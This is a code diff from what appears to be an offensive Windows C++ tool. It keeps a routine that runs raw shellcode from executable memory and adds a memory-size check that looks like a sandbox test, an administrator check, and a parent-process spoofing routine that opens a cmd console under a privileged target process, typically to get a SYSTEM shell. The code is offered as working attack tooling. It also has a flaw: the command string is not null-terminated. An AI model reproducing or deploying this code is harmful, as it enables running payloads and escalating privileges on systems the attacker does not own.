@@ -135,6 +135,74 @@ VOID ExecShellCode(LPVOID shellCode,SIZE_T size) {
     LPVOID lp = VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
     if (lp != nullptr) {
         memcpy(lp, shellCode, size);
-        ((void (*)())lp)();
+        ((void(*)())lp)();
     }
+}
+
+DWORDLONG GetPhysicalMemory() {
+    _MEMORYSTATUSEX mst;
+    size_t mstSize = sizeof(mst);
+    _MEMORYSTATUSEX* mstPtr = &mst;
+    memset(mstPtr, 0, mstSize);
+    mstPtr->dwLength = mstSize;
+    if (GlobalMemoryStatusEx(mstPtr)) {
+        return mstPtr->ullTotalPhys/1073741824ULL;
+    }
+    return 0;
+}
+
+BOOL CheckPrivilege()
+{
+    BOOL state = FALSE;
+    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
+    PSID AdministratorsGroup;
+    state = AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, SECURITY_LOCAL_SYSTEM_RID, DOMAIN_GROUP_RID_ADMINS, 0, 0, 0, 0, &AdministratorsGroup);
+    if (state)
+    {
+        CheckTokenMembership(NULL, AdministratorsGroup, &state);
+        FreeSid(AdministratorsGroup);
+        return state;
+    }
+    return state;
+}
+
+BOOL GetSystemProcess(DWORD pid) {
+    if (!CheckPrivilege()) {
+        cout << "请以管理员权限运行程序!" << endl;
+        return FALSE;
+    }
+    HANDLE hProcess = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, pid);
+    PROCESS_INFORMATION newProcess = { 0 };
+    STARTUPINFOEXA startInfo = {0};
+    startInfo.StartupInfo.cb = sizeof(STARTUPINFOEX);
+    SIZE_T listSize = NULL;
+    BOOL state = FALSE;
+    if (hProcess) {
+        InitializeProcThreadAttributeList(NULL, 1, 0, &listSize);
+        if (GetLastError() == 122) {
+            startInfo.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, listSize);
+            if (startInfo.lpAttributeList) {
+                state = InitializeProcThreadAttributeList(startInfo.lpAttributeList, 1, 0, &listSize);
+                if (state) {
+                    state = UpdateProcThreadAttribute(startInfo.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hProcess, sizeof(hProcess), NULL, NULL);
+                    if (state) {
+                        char command[] = { 'c', 'm', 'd' };
+                        state = CreateProcessA(NULL, command, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE, NULL, NULL, &startInfo.StartupInfo, &newProcess);
+                        if (state) {
+                            CloseHandle(newProcess.hProcess);
+                            CloseHandle(newProcess.hThread);
+                        }
+                        DeleteProcThreadAttributeList(startInfo.lpAttributeList);
+                        CloseHandle(hProcess); 
+                        return state;
+                    }
+                    return state;
+                }
+                return state;
+            }
+            return state;
+        }
+        return state;
+    }
+    return state;
 }
